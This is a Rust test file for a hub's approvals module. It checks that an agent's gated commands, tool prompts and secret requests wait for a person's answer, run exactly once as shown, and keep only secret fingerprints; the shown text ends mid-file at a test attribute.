use super::*;
use crate::hub::store::HubDb;
use crate::hub::usage::ports::WaitPage;
use fleetd_contracts::events::HubEvent;
use fleetd_contracts::ledger::{CheckerNote, CheckerVerdict};
use fleetd_contracts::navi::{AutoApprovedBy, NaviApprovalMode, NaviApprovals};
use fleetd_contracts::sessions::{PendingPermission, PermissionDecision};
use std::sync::Mutex;

fn verdict(verdict: CheckerVerdict, reason: &str) -> CheckerNote {
    CheckerNote {
        verdict,
        reason: fleetd_contracts::prim::Line::unchecked(reason),
    }
}

/// The approvals over a real request store, a scripted node and a recorded event log.
struct Fake {
    requests: Arc<Requests>,
    linked: Mutex<bool>,
    events: Mutex<Vec<NewEvent>>,
    /// Each lead wake: `<requestId> <state>`.
    woken: Mutex<Vec<String>>,
    woke: tokio::sync::Notify,
    /// Each gated command the node ran: machine and input.
    runs: Mutex<Vec<(String, Value)>>,
    gated_reply: Mutex<Result<GatedOutcome, NodeCommandError>>,
    /// Each sealed secret the node took: machine and input.
    secrets: Mutex<Vec<(String, Value)>>,
    /// The project's open orders; every other order is refused.
    open_orders: Mutex<Vec<&'static str>>,
    /// The hub fails to record an order's variable.
    order_save_fails: Mutex<bool>,
    /// Each variable recorded for an order.
    order_saved: Mutex<Vec<OrderEnvSaved>>,
    /// Each permission answer the node took: machine, thread, prompt and decision.
    answers: Mutex<Vec<(String, String, String, PermissionDecision)>>,
    /// The node fails each answer with this.
    answer_fails: Mutex<Option<NodeCommandError>>,
    /// The prompt the thread waits on, as the machine stream has it.
    pending: Mutex<Option<PendingPermission>>,
    /// The project's MCP servers, for the integrations policy.
    servers: Mutex<Vec<fleetd_contracts::mcp_servers::McpServer>>,
    /// The project is a Navi whose lead is thread t1 (true by default), and the sites it may visit unasked, each with
    /// who allowed it.
    navi: Mutex<bool>,
    sites: Mutex<Vec<(String, String)>>,
    /// The Navi's approval mode (ask by default here, so each prompt files its card) and the fake checker's verdict.
    mode: Mutex<NaviApprovalMode>,
    verdict: Mutex<CheckerNote>,
    /// Each action the checker judged.
    checked: Mutex<Vec<crate::hub::navi::checker::Action>>,
    /// Each action that ran without asking: what, by whom, and the checker's reason.
    auto: Mutex<Vec<(String, AutoApprovedBy, Option<String>)>>,
}

impl Default for Fake {
    fn default() -> Self {
        Self {
            requests: Requests::new(HubDb::open_memory().unwrap()),
            linked: Mutex::new(false),
            events: Mutex::default(),
            woken: Mutex::default(),
            woke: tokio::sync::Notify::new(),
            runs: Mutex::default(),
            gated_reply: Mutex::new(Ok(GatedOutcome {
                exit_code: Some(0),
                output_tail: "migrated 3 tables\n".into(),
                ..Default::default()
            })),
            secrets: Mutex::default(),
            open_orders: Mutex::new(vec!["W7"]),
            order_save_fails: Mutex::new(false),
            order_saved: Mutex::default(),
            answers: Mutex::default(),
            answer_fails: Mutex::default(),
            pending: Mutex::default(),
            servers: Mutex::default(),
            navi: Mutex::new(true),
            sites: Mutex::default(),
            mode: Mutex::new(NaviApprovalMode::Ask),
            verdict: Mutex::new(verdict(CheckerVerdict::Ask, "unsure")),
            checked: Mutex::default(),
            auto: Mutex::default(),
        }
    }
}

impl Fake {
    /// Waits until the lead was woken `n` times in all.
    async fn woken_times(&self, n: usize) {
        while self.woken.lock().unwrap().len() < n {
            self.woke.notified().await;
        }
    }
    fn request(&self, id: &str) -> HumanRequest {
        self.requests.get(id).unwrap().unwrap()
    }
    /// Stores an open command approval.
    fn stored(&self) -> HumanRequest {
        self.requests
            .create(NewRequest {
                project_ref: serde_json::from_value(
                    json!({ "machineId": "lab-a", "projectId": "p1" }),
                )
                .unwrap(),
                workstream_id: None,
                kind: RequestKind::Approval,
                text: "lab-a: ls".into(),
                secret: None,
                gated: Some(
                    serde_json::from_value(json!({ "argv": ["ls"], "cwd": "/w/p1", "class": "irreversible", "reason": "look", "timeoutSec": 60 }))
                        .unwrap(),
                ),
                permission: None,
                purchase: None,
                secure_input: None,
                at: fleetd_contracts::ids::Timestamp("2026-10-18T10:00:00.000Z".into()),
                at_ms: 0,
            })
            .unwrap()
    }
}

impl ApprovalNodes for Fake {
    fn deliver_secret(
        &self,
        m: &str,
        input: Value,
    ) -> BoxFut<'_, Result<SecretOutcome, NodeCommandError>> {
        self.secrets.lock().unwrap().push((m.into(), input));
        Box::pin(async {
            Ok(SecretOutcome {
                fingerprint: Some("ab12cd34".into()),
                error: None,
            })
        })
    }
    fn run_gated(
        &self,
        m: &str,
        input: Value,
    ) -> BoxFut<'_, Result<GatedOutcome, NodeCommandError>> {
        self.runs.lock().unwrap().push((m.into(), input));
        let reply = self.gated_reply.lock().unwrap().clone();
        Box::pin(async move { reply })
    }
    fn is_linked(&self, _: &str) -> BoxFut<'_, bool> {
        let l = *self.linked.lock().unwrap();
        Box::pin(async move { l })
    }
    fn answer_permission(
        &self,
        m: &str,
        t: &str,
        request_id: &str,
        decision: PermissionDecision,
        _by: Option<fleetd_contracts::time::DecidedBy>,
    ) -> BoxFut<'_, Result<(), NodeCommandError>> {
        let result = match self.answer_fails.lock().unwrap().clone() {
            Some(e) => Err(e),
            None => {
                self.answers.lock().unwrap().push((
                    m.into(),
                    t.into(),
                    request_id.into(),
                    decision,
                ));
                Ok(())
            }
        };
        Box::pin(async move { result })
    }
    fn pending_permission(&self, _: &str, _: &str) -> BoxFut<'_, Option<PendingPermission>> {
        let p = self.pending.lock().unwrap().clone();
        Box::pin(async move { p })
    }
}

impl ApprovalHub for Fake {
    fn navi_lead(&self, _: &ProjectRef, thread_id: &str) -> BoxFut<'_, bool> {
        let lead = *self.navi.lock().unwrap() && thread_id == "t1";
        Box::pin(async move { lead })
    }
    fn navi_site(&self, _: &ProjectRef, site: Option<&str>) -> BoxFut<'_, Option<bool>> {
        let known = (*self.navi.lock().unwrap()).then(|| {
            site.is_some_and(|s| {
                self.sites
                    .lock()
                    .unwrap()
                    .iter()
                    .any(|(known, _)| known == s)
            })
        });
        Box::pin(async move { known })
    }
    fn navi_site_allow(&self, _: &ProjectRef, site: &str, by: &str) -> BoxFut<'_, ()> {
        self.sites.lock().unwrap().push((site.into(), by.into()));
        Box::pin(async {})
    }
    fn navi_image<'a>(
        &'a self,
        _: &'a ProjectRef,
        id: &'a fleetd_contracts::mcp::AttachmentId,
    ) -> BoxFut<'a, bool> {
        let ours = id.as_str() == "F7";
        Box::pin(async move { ours })
    }
    fn navi_approvals(&self, _: &ProjectRef) -> BoxFut<'_, Option<NaviApprovals>> {
        let settings = (*self.navi.lock().unwrap()).then(|| NaviApprovals {
            mode: *self.mode.lock().unwrap(),
            model: fleetd_contracts::effort::ModelName::unchecked("claude-sonnet-5-5"),
            effort: fleetd_contracts::effort::Effort::Medium,
            defaults: true,
        });
        Box::pin(async move { settings })
    }
    fn navi_check<'a>(
        &'a self,
        _: &'a ProjectRef,
        _: &'a str,
        action: &'a crate::hub::navi::checker::Action,
        _: &'a NaviApprovals,
    ) -> BoxFut<'a, CheckerNote> {
        self.checked.lock().unwrap().push(action.clone());
        let note = self.verdict.lock().unwrap().clone();
        Box::pin(async move { note })
    }
    fn navi_auto_approved<'a>(
        &'a self,
        _: &'a ProjectRef,
        action: &'a crate::hub::navi::checker::Action,
        by: AutoApprovedBy,
        reason: Option<&'a str>,
    ) -> BoxFut<'a, ()> {
        self.auto
            .lock()
            .unwrap()
            .push((action.what(), by, reason.map(str::to_owned)));
        Box::pin(async {})
    }
    fn mcp_servers(
        &self,
        _: &ProjectRef,
    ) -> BoxFut<'_, Vec<fleetd_contracts::mcp_servers::McpServer>> {
        let servers = self.servers.lock().unwrap().clone();
        Box::pin(async move { servers })
    }
    fn box_key(&self, m: &str) -> BoxFut<'_, Option<Option<String>>> {
        let key = (m == "lab-a").then(|| Some("box-key".to_string()));
        Box::pin(async move { key })
    }
    fn workspace_root(&self, _: &ProjectRef) -> BoxFut<'_, Option<String>> {
        Box::pin(async { Some("/w/p1".into()) })
    }
    fn wake_request(&self, r: &HumanRequest) -> BoxFut<'_, ()> {
        self.woken
            .lock()
            .unwrap()
            .push(format!("{} {}", r.request_id, r.state.as_str()));
        self.woke.notify_one();
        Box::pin(async {})
    }
    fn order_refusal(&self, _: &ProjectRef, order_id: &str) -> BoxFut<'_, Option<String>> {
        let why = (!self.open_orders.lock().unwrap().contains(&order_id))
            .then(|| format!("{order_id} is closed."));
        Box::pin(async move { why })
    }
    fn order_env_saved(&self, saved: OrderEnvSaved) -> BoxFut<'_, Result<(), String>> {
        let result = if *self.order_save_fails.lock().unwrap() {
            Err("the hub could not record it, so the node dropped it again".to_owned())
        } else {
            self.order_saved.lock().unwrap().push(saved);
            Ok(())
        };
        Box::pin(async move { result })
    }
}

impl EventLog for Fake {
    fn append(&self, e: NewEvent) -> BoxFut<'_, HubEvent> {
        self.events.lock().unwrap().push(e.clone());
        Box::pin(async move {
            serde_json::from_value(json!({
                "seq": 1, "at": e.at, "type": e.kind, "machineId": e.machine_id, "projectId": e.project_id,
                "threadId": e.thread_id, "summary": e.summary, "data": e.data, "attention": e.attention,
            }))
            .unwrap()
        })
    }
    fn head(&self) -> BoxFut<'_, u64> {
        Box::pin(async { 0 })
    }
    fn wait(&self, _: WaitInput) -> BoxFut<'_, WaitPage> {
        Box::pin(async { WaitPage::default() })
    }
}

fn approvals(fake: &Arc<Fake>) -> Arc<Approvals> {
    Approvals::new(ApprovalsDeps {
        requests: fake.requests.clone(),
        nodes: fake.clone(),
        hub: fake.clone(),
        events: fake.clone(),
        clock: Arc::new(crate::clock::SystemClock),
    })
}

fn p1() -> ProjectRef {
    ProjectRef {
        machine_id: "lab-a".into(),
        project_id: "p1".into(),
    }
}

const ANYWHERE: &(dyn Fn(&str) -> bool + Sync) = &|_: &str| true;
const NOWHERE: &(dyn Fn(&str) -> bool + Sync) = &|_: &str| false;

fn person() -> Caller<'static> {
    Caller {
        human: true,
        name: "desk",
        person: None,
        allows_operate: ANYWHERE,
    }
}

fn agent() -> Caller<'static> {
    Caller {
        human: false,
        name: "lead-key",
        person: None,
        allows_operate: ANYWHERE,
    }
}

fn migration() -> GatedRunInput {
    GatedRunInput {
        argv: vec!["sh".into(), "-c".into(), "make migrate".into()],
        cwd: None,
        class: "irreversible".into(),
        reason: "apply the schema change".into(),
        secret_env: None,
        timeout_sec: 600,
        workstream_id: None,
    }
}

/// The gated-run approval path: the lead's command waits as an open approval; only a person's Approve runs it, exactly
/// as stored, and the outcome reaches the lead.
#[tokio::test]
async fn approve_runs_the_stored_command_and_wakes_the_lead_with_its_outcome() {
    let fake = Arc::new(Fake::default());
    let a = approvals(&fake);
    let open = a.gated_run(&p1(), migration()).await.unwrap();
    assert_eq!(
        (open.request_id.as_str(), open.state),
        ("Q1", RequestState::Open)
    );
    assert_eq!(
        open.text.as_str(),
        "Run sh -c \"make migrate\" on lab-a in /w/p1: apply the schema change"
    );
    let item = serde_json::to_value(chat_item(&open)).unwrap();
    assert_eq!(
        (item["kind"].as_str(), item["state"].as_str()),
        (Some("command_approval"), Some("open"))
    );
    assert!(
        fake.runs.lock().unwrap().is_empty(),
        "nothing runs before a person approves it"
    );

    let refused = a.answer(&agent(), "Q1", true, None).await.unwrap_err();
    assert_eq!(refused.code, "forbidden", "an agent key never approves");
    let ungranted = Caller {
        allows_operate: NOWHERE,
        ..person()
    };
    assert_eq!(
        a.answer(&ungranted, "Q1", true, None)
            .await
            .unwrap_err()
            .code,
        "forbidden"
    );
    assert_eq!(
        a.answer(&person(), "Q9", true, None)
            .await
            .unwrap_err()
            .code,
        "not_found"
    );

    let approved = a.answer(&person(), "Q1", true, None).await.unwrap();
    assert_eq!(approved.answered_by.as_deref(), Some("human:desk"));
    fake.woken_times(1).await;
    assert_eq!(
        fake.runs.lock().unwrap().as_slice(),
        [(
            "lab-a".to_string(),
            json!({ "argv": ["sh", "-c", "make migrate"], "cwd": "/w/p1", "timeoutSec": 600 })
        )]
    );
    let ran = fake.request("Q1");
    assert_eq!(
        (
            ran.state,
            ran.exit_code,
            ran.evidence.as_ref().map(|e| e.as_str())
        ),
        (
            RequestState::Ran,
            Some(0),
            Some("exit 0 on lab-a, approved by human:desk")
        )
    );
    assert_eq!(
        ran.output_tail.as_ref().map(|t| t.as_str()),
        Some("migrated 3 tables")
    );
    // When the result came back, so the app can say how long it ran; never before it was approved.
    let finished = ran
        .finished_at
        .as_ref()
        .expect("a ran command records when it finished");
    assert!(finished.0 >= approved.answered_at.as_ref().unwrap().0);
    assert!(approved.finished_at.is_none());
    assert_eq!(fake.woken.lock().unwrap().as_slice(), ["Q1 ran"]);
    let again = a.answer(&person(), "Q1", true, None).await.unwrap_err();
    assert_eq!(
        (again.code.as_str(), again.message.as_str()),
        ("invalid", "Q1 is already ran.")
    );
    assert_eq!(
        fake.runs.lock().unwrap().len(),
        1,
        "a command runs once per approval"
    );
}

#[tokio::test]
async fn deny_never_runs_the_command_and_an_offline_node_puts_it_back_to_the_person() {
    let fake = Arc::new(Fake::default());
    let a = approvals(&fake);
    a.gated_run(&p1(), migration()).await.unwrap();
    let denied = a
        .answer(&person(), "Q1", false, Some("not on a Friday".into()))
        .await
        .unwrap();
    assert_eq!(
        (denied.state, denied.evidence.as_ref().map(|e| e.as_str())),
        (RequestState::Denied, Some("not on a Friday"))
    );
    assert!(fake.runs.lock().unwrap().is_empty());
    assert_eq!(fake.woken.lock().unwrap().as_slice(), ["Q1 denied"]);
    let (_, outcome) = crate::hub::usage::wire_approvals::request_outcome(&denied);
    assert_eq!(
        outcome,
        "denied by human:desk: not on a Friday; don't run it, say in the chat what you do instead"
    );

    a.gated_run(&p1(), migration()).await.unwrap();
    *fake.gated_reply.lock().unwrap() = Err(NodeCommandError {
        reason: "offline".into(),
        message: "lab-a's node is not linked to the hub".into(),
        fix: None,
    });
    a.answer(&person(), "Q2", true, None).await.unwrap();
    fake.woken_times(2).await;
    let back = fake.request("Q2");
    assert_eq!(
        back.state,
        RequestState::Open,
        "nothing ran, so the person approves it again"
    );
    assert!(back.answered_by.is_none());
    assert!(
        back.evidence
            .as_ref()
            .unwrap()
            .as_str()
            .starts_with("not run: lab-a's node was offline when human:desk approved it"),
        "{:?}",
        back.evidence
    );
}

#[tokio::test]
async fn a_secret_is_entered_by_request_id_and_only_its_fingerprint_is_kept() {
    let fake = Arc::new(Fake::default());
    let a = approvals(&fake);
    let call: fleetd_contracts::lead_calls::RequestSecretCall = serde_json::from_value(json!({
        "key": "stripe.test_key", "sink": "env:lab-a:/srv/app/.env", "text": "The Stripe test key",
    }))
    .unwrap();
    let open = a.request_secret(&p1(), call).await.unwrap();
    let item = serde_json::to_value(chat_item(&open)).unwrap();
    assert_eq!(
        (item["kind"].as_str(), item["requestId"].as_str()),
        (Some("secret_request"), Some("Q1"))
    );

    let refused = a
        .submit_secret(&agent(), "Q1", "sealed-bytes")
        .await
        .unwrap_err();
    assert_eq!(
        refused.code, "forbidden",
        "agent keys never handle secret values"
    );
    let saved = a
        .submit_secret(&person(), "Q1", "sealed-bytes")
        .await
        .unwrap();
    assert_eq!(saved["fingerprint"], "ab12cd34");
    assert_eq!(
        fake.secrets.lock().unwrap().as_slice(),
        [(
            "lab-a".to_string(),
            json!({ "sink": "env:lab-a:/srv/app/.env", "sealed": "sealed-bytes", "secretKey": "stripe.test_key" })
        )]
    );
    let stored = fake.request("Q1");
    assert_eq!(stored.state, RequestState::Stored);
    assert_eq!(
        stored.secret.unwrap().fingerprint.unwrap().as_str(),
        "ab12cd34"
    );
    assert_eq!(fake.woken.lock().unwrap().as_slice(), ["Q1 stored"]);
    let stored_text = serde_json::to_string(&fake.request("Q1")).unwrap();
    let events = serde_json::to_string(
        &*fake
            .events
            .lock()
            .unwrap()
            .iter()
            .map(|e| (e.summary.clone(), e.data.clone()))
            .collect::<Vec<_>>(),
    )
    .unwrap();
    assert!(
        !stored_text.contains("sealed-bytes") && !events.contains("sealed-bytes"),
        "the ciphertext is never kept"
    );
    assert_eq!(
        a.submit_secret(&person(), "Q1", "again")
            .await
            .unwrap_err()
            .code,
        "invalid"
    );
}

/// An `order:` sink: only an open order of the project, on its machine, under a name an order may set; the node gets
/// the project with the box, and the hub records the variable's name, fingerprint and size for the order.
#[tokio::test]
async fn an_order_sink_reaches_that_orders_node_and_is_recorded_for_it() {
    let fake = Arc::new(Fake::default());
    let a = approvals(&fake);
    let ask = |sink: &str, env: Option<&str>| {
        let mut call = json!({ "key": "db.url", "sink": sink, "text": "W7's writer needs the staging database" });
        if let Some(env) = env {
            call["envName"] = env.into();
        }
        serde_json::from_value::<fleetd_contracts::lead_calls::RequestSecretCall>(call).unwrap()
    };
    for (sink, env) in [
        ("order:lab-b:W7", None),
        ("order:lab-a:W8", None),
        ("order:lab-a:W7", Some("CLAUDE_CODE_USE_BEDROCK")),
    ] {
        let refused = a.request_secret(&p1(), ask(sink, env)).await;
        assert!(refused.is_err(), "{sink} {env:?}");
    }
    let open = a
        .request_secret(&p1(), ask("order:lab-a:W7", None))
        .await
        .unwrap();
    assert_eq!(open.workstream_id.as_ref().map(|w| w.as_str()), Some("W7"));
    // 10 bytes sealed: 58 bytes of box.
    let sealed = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, [7u8; 58]);
    a.submit_secret(&person(), open.request_id.as_str(), &sealed)
        .await
        .unwrap();
    assert_eq!(
        fake.secrets.lock().unwrap().as_slice(),
        [(
            "lab-a".to_string(),
            json!({ "sink": "order:lab-a:W7", "sealed": sealed, "secretKey": "db.url", "projectId": "p1" })
        )]
    );
    assert_eq!(
        fake.order_saved.lock().unwrap().as_slice(),
        [OrderEnvSaved {
            project: p1(),
            order_id: "W7".into(),
            name: "DB_URL".into(),
            fingerprint: "ab12cd34".into(),
            bytes: 10,
            request_id: open.request_id.to_string(),
        }]
    );
    assert_eq!(
        fake.request(open.request_id.as_str()).state,
        RequestState::Stored
    );

    // A record the hub can't keep: refused, so the person enters it again; the request stays open.
    let again = a
        .request_secret(&p1(), ask("order:lab-a:W7", Some("API_KEY")))
        .await
        .unwrap();
    *fake.order_save_fails.lock().unwrap() = true;
    let refused = a
        .submit_secret(&person(), again.request_id.as_str(), &sealed)
        .await
        .unwrap_err();
    assert_eq!(refused.code, "failed");
    assert_eq!(
        fake.request(again.request_id.as_str()).state,
        RequestState::Open
    );
    *fake.order_save_fails.lock().unwrap() = false;

    // The order closed before the person entered it: nothing reaches the node.
    fake.open_orders.lock().unwrap().clear();
    let delivered = fake.secrets.lock().unwrap().len();
    let late = a
        .submit_secret(&person(), again.request_id.as_str(), &sealed)
        .await
        .unwrap_err();
    assert!(late.message.contains("W7 is closed"), "{late:?}");
    assert_eq!(fake.secrets.lock().unwrap().len(), delivered);
}

#[tokio::test]
async fn a_lead_withdraws_its_own_projects_requests_only() {
    let fake = Arc::new(Fake::default());
    let a = approvals(&fake);
    a.gated_run(&p1(), migration()).await.unwrap();
    let other = ProjectRef {
        machine_id: "lab-a".into(),
        project_id: "p2".into(),
    };
    assert_eq!(
        a.withdraw(&other, "lead:lab-a/p2", "Q1")
            .await
            .unwrap_err()
            .code,
        "not_found"
    );
    let done = a.withdraw(&p1(), "lead:lab-a/p1", "Q1").await.unwrap();
    assert_eq!(done.state, RequestState::Denied);
    assert_eq!(
        a.answer(&person(), "Q1", true, None)
            .await
            .unwrap_err()
            .code,
        "invalid"
    );
    assert!(fake.runs.lock().unwrap().is_empty());
}

#[tokio::test]
async fn after_a_restart_an_approved_command_goes_back_to_the_person_and_never_runs_late() {
    let fake = Arc::new(Fake::default());
    let a = approvals(&fake);
    a.gated_run(&p1(), migration()).await.unwrap();
    a.gated_run(&p1(), migration()).await.unwrap();
    for (id, evidence) in [
        ("Q1", None),
        ("Q2", Some("running on lab-a, approved by human:desk")),
    ] {
        fake.requests
            .update(&ChatRequestId::unchecked(id), |r| {
                r.state = RequestState::Approved;
                r.evidence = evidence.map(fleetd_contracts::prim::Text::unchecked);
            })
            .unwrap();
    }
    a.reopen_unfinished().await;
    assert_eq!(fake.request("Q1").state, RequestState::Open);
    assert_eq!(
        fake.request("Q1").evidence.unwrap().as_str(),
        NOT_RUN_AFTER_RESTART
    );
    assert!(
        fake.request("Q2")
            .evidence
            .unwrap()
            .as_str()
            .starts_with("interrupted, result unknown: the hub restarted while it ran on lab-a")
    );
    assert!(fake.runs.lock().unwrap().is_empty());
}

/// An update restarts the node while an approved command runs: the link drops, and the command goes back to the person
/// as interrupted with its result unknown. It never runs again by itself, not even once the node is back.
#[tokio::test]
async fn a_command_an_update_cut_off_is_reported_interrupted_and_never_run_again() {
    let fake = Arc::new(Fake::default());
    let a = approvals(&fake);
    a.gated_run(&p1(), migration()).await.unwrap();
    *fake.gated_reply.lock().unwrap() = Err(NodeCommandError {
        reason: "lost".into(),
        message: "the link to lab-a's node dropped while the command ran".into(),
        fix: None,
    });
    a.answer(&person(), "Q1", true, None).await.unwrap();
    fake.woken_times(1).await;
    let back = fake.request("Q1");
    assert_eq!(back.state, RequestState::Open);
    assert_eq!(
        back.evidence.as_ref().map(|e| e.as_str()),
        Some(
            "interrupted, result unknown: the link to lab-a's node dropped while the command ran; check on lab-a whether it ran \
             before approving it again"
        )
    );
    // The node is back (and the hub restarted too): nothing runs it again.
    *fake.linked.lock().unwrap() = true;
    a.reopen_unfinished().await;
    assert_eq!(
        fake.runs.lock().unwrap().len(),
        1,
        "it ran once, when it was approved"
    );
    assert_eq!(fake.request("Q1").state, RequestState::Open);
}

/// Two people answer the same approval at once: exactly one answer counts, and the command runs once.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn two_answers_at_once_run_the_command_once() {
    for _ in 0..20 {
        let fake = Arc::new(Fake::default());
        let a = approvals(&fake);
        a.gated_run(&p1(), migration()).await.unwrap();
        let (one, two) = tokio::join!(
            {
                let a = a.clone();
                tokio::spawn(async move { a.answer(&person(), "Q1", true, None).await })
            },
            {
                let a = a.clone();
                tokio::spawn(async move { a.answer(&person(), "Q1", true, None).await })
            },
        );
        let results = [one.unwrap(), two.unwrap()];
        assert_eq!(
            results.iter().filter(|r| r.is_ok()).count(),
            1,
            "one answer counts"
        );
        let refused = results.iter().find_map(|r| r.as_ref().err()).unwrap();
        assert_eq!(refused.code, "invalid");
        fake.woken_times(1).await;
        assert_eq!(fake.runs.lock().unwrap().len(), 1, "the command runs once");
        assert_eq!(fake.request("Q1").state, RequestState::Ran);
    }
}

/// An approve racing a deny: whichever lands first decides, and a denied command never ran.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn an_approve_racing_a_deny_never_ends_denied_after_running() {
    for _ in 0..20 {
        let fake = Arc::new(Fake::default());
        let a = approvals(&fake);
        a.gated_run(&p1(), migration()).await.unwrap();
        let (go, no) = tokio::join!(
            {
                let a = a.clone();
                tokio::spawn(async move { a.answer(&person(), "Q1", true, None).await })
            },
            {
                let a = a.clone();
                tokio::spawn(async move { a.answer(&person(), "Q1", false, None).await })
            },
        );
        let (go, no) = (go.unwrap(), no.unwrap());
        assert!(go.is_ok() != no.is_ok(), "exactly one answer counts");
        fake.woken_times(1).await;
        let r = fake.request("Q1");
        if go.is_ok() {
            assert_eq!(
                (r.state, fake.runs.lock().unwrap().len()),
                (RequestState::Ran, 1)
            );
        } else {
            assert_eq!(
                (r.state, fake.runs.lock().unwrap().len()),
                (RequestState::Denied, 0)
            );
        }
    }
}

/// The store's guard itself: of many writers moving one open request, exactly one wins.
#[test]
fn only_one_guarded_write_moves_a_request() {
    let fake = Fake::default();
    let r = fake.stored();
    let requests = fake.requests.clone();
    let won: usize = std::thread::scope(|s| {
        let handles: Vec<_> = (0..8)
            .map(|_| {
                let (requests, id) = (requests.clone(), r.request_id.clone());
                s.spawn(move || {
                    requests
                        .update_from(&id, RequestState::Open, |r| {
                            r.state = RequestState::Approved
                        })
                        .is_ok() as usize
                })
            })
            .collect();
        handles.into_iter().map(|h| h.join().unwrap()).sum()
    });
    assert_eq!(won, 1);
    let moved = requests
        .update_from(&r.request_id, RequestState::Open, |r| {
            r.state = RequestState::Denied
        })
        .unwrap_err();
    assert_eq!(moved.to_string(), "Q1 is already approved");
}

/// Teams: an approval and a secret record the person who answered, next to their device.
#[tokio::test]
async fn an_approval_and_a_secret_record_the_person_who_answered() {
    let alice = fleetd_contracts::people::PersonRef {
        person_id: fleetd_contracts::people::PersonId::unchecked("p_alice234"),
        name: fleetd_contracts::people::PersonName::unchecked("Alice"),
    };
    let fake = Arc::new(Fake::default());
    let a = approvals(&fake);
    let alices = Caller {
        person: Some(&alice),
        ..person()
    };
    a.gated_run(&p1(), migration()).await.unwrap();
    let approved = a.answer(&alices, "Q1", true, None).await.unwrap();
    assert_eq!(approved.answered_by.as_deref(), Some("human:desk"));
    assert_eq!(approved.answered_by_person.as_ref(), Some(&alice));

    let call: fleetd_contracts::lead_calls::RequestSecretCall = serde_json::from_value(json!({
        "key": "stripe.test_key", "sink": "env:lab-a:/srv/app/.env", "text": "The Stripe test key",
    }))
    .unwrap();
    let open = a.request_secret(&p1(), call).await.unwrap();
    a.submit_secret(&alices, open.request_id.as_str(), "sealed-bytes")
        .await
        .unwrap();
    let saved = fake.request(open.request_id.as_str());
    assert_eq!(saved.answered_by_person.as_ref(), Some(&alice));
}

fn prompt(request_id: &str, tool: &str, summary: &str) -> Value {
    json!({ "requestId": request_id, "toolName": tool, "summary": summary })
}

fn event(kind: &str, permission: Option<Value>) -> HubEvent {
    let mut data = json!({ "status": "waiting" });
    if let Some(p) = permission {
        data["permission"] = p;
    }
    serde_json::from_value(json!({
        "seq": 7, "at": "2026-10-27T10:00:00.000Z", "type": kind, "machineId": "lab-a", "projectId": "p1",
        "threadId": "t1", "summary": "", "data": data,
    }))
    .unwrap()
}

fn requests(fake: &Fake) -> Vec<HumanRequest> {
    fake.requests
        .list(&RequestFilter {
            limit: 10,
            ..Default::default()
        })
        .unwrap()
}

/// A Navi's message through its CRM: what the approval shows is what runs once approved.
fn send_input() -> Value {
    json!({ "to": ["ana@example.com"], "subject": "Saturday", "body": "Could we book a cleaning?" })
}

/// A Navi's custom MCP server, `crm`, with the tools the person marked as reads.
fn crm() -> fleetd_contracts::mcp_servers::McpServer {
    integration("crm", &["list_contacts"])
}

fn pending_with(request_id: &str, tool: &str, input: Option<Value>) -> PendingPermission {
    let mut p = prompt(request_id, tool, "a call");
    if let Some(input) = input {
        p["input"] = input;
    }
    serde_json::from_value(p).unwrap()
}

#[tokio::test]
async fn a_prompt_becomes_one_approval_and_approve_runs_the_tool_with_exactly_the_input_shown() {
    let fake = Arc::new(Fake::default());
    *fake.servers.lock().unwrap() = vec![crm()];
    let a = approvals(&fake);
    let tool = "mcp__crm__send_message";
    *fake.pending.lock().unwrap() = Some(
        serde_json::from_value(json!({
            "requestId": "q1", "toolName": tool, "summary": "send to ana@example.com", "input": send_input(),
        }))
        .unwrap(),
    );
    let waiting = event(
        "thread.waiting",
        Some(prompt("q1", tool, "send to ana@example.com")),
    );
    a.on_thread_event(&waiting).await;
    a.on_thread_event(&waiting).await;
    let open = requests(&fake);
    assert_eq!(open.len(), 1, "the same prompt is filed once");
    let r = &open[0];
    assert_eq!(
        (r.kind, r.state, r.text.as_str()),
        (
            RequestKind::Approval,
            RequestState::Open,
            "mcp__crm__send_message: send to ana@example.com"
        )
    );
    let permission = serde_json::to_value(&r.permission).unwrap();
    assert_eq!(
        (
            &permission["threadId"],
            &permission["requestId"],
            &permission["toolName"],
            &permission["input"]
        ),
        (&json!("t1"), &json!("q1"), &json!(tool), &send_input())
    );
    // The card: the tool, and the whole input it runs with.
    assert_eq!(permission["preview"]["server"], "crm");
    assert_eq!(permission["preview"]["action"], "send");
    assert!(
        permission["preview"]["input"]
            .as_str()
            .unwrap()
            .contains("Could we book a cleaning?")
    );
    // The chat shows it like a gated command, with the tool, its input and the card.
    let item = serde_json::to_value(chat_item(r)).unwrap();
    assert_eq!(item["kind"], "command_approval");
    assert_eq!(item["permission"]["input"], send_input());
    assert_eq!(
        item["permission"]["preview"]["title"],
        "Use send_message on crm"
    );
    assert!(
        fake.answers.lock().unwrap().is_empty(),
        "nothing is answered for the person"
    );

    // Only a person answers it.
    assert!(a.answer(&agent(), "Q1", true, None).await.is_err());
    a.answer(&person(), "Q1", true, None).await.unwrap();
    assert_eq!(
        fake.answers.lock().unwrap().as_slice(),
        [(
            "lab-a".into(),
            "t1".into(),
            "q1".into(),
            PermissionDecision::Allow {
                updated_input: Some(send_input())
            }
        )]
    );
    assert_eq!(
        fake.request("Q1").evidence.unwrap().as_str(),
        "allowed on lab-a, answered by human:desk"
    );
    assert!(
        fake.runs.lock().unwrap().is_empty(),
        "a tool prompt never runs a gated command"
    );
    assert!(
        fake.woken.lock().unwrap().is_empty(),
        "the run itself goes on: no wake"
    );
}

#[tokio::test]
async fn deny_tells_the_run_who_said_no_and_an_undelivered_approve_goes_back_to_the_person() {
    let fake = Arc::new(Fake::default());
    let a = approvals(&fake);
    bash(&a, &fake, "q1", "agent-browser open https://mail.example").await;
    a.answer(&person(), "Q1", false, Some("not my mail".into()))
        .await
        .unwrap();
    let answers = fake.answers.lock().unwrap().clone();
    let PermissionDecision::Deny { message } = &answers[0].3 else {
        panic!("{answers:?}")
    };
    assert_eq!(message.as_str(), "human:desk said no (Q1): not my mail");
    assert_eq!(fake.request("Q1").state, RequestState::Denied);

    // The node is offline when the person approves: nothing ran, so it is theirs to approve again.
    bash(&a, &fake, "q2", "agent-browser open https://a.example").await;
    *fake.answer_fails.lock().unwrap() = Some(NodeCommandError {
        reason: "offline".into(),
        message: "lab-a is offline".into(),
        fix: None,
    });
    a.answer(&person(), "Q2", true, None).await.unwrap();
    let q2 = fake.request("Q2");
    assert_eq!(q2.state, RequestState::Open);
    assert!(q2.evidence.unwrap().as_str().starts_with("not delivered"));
}

#[tokio::test]
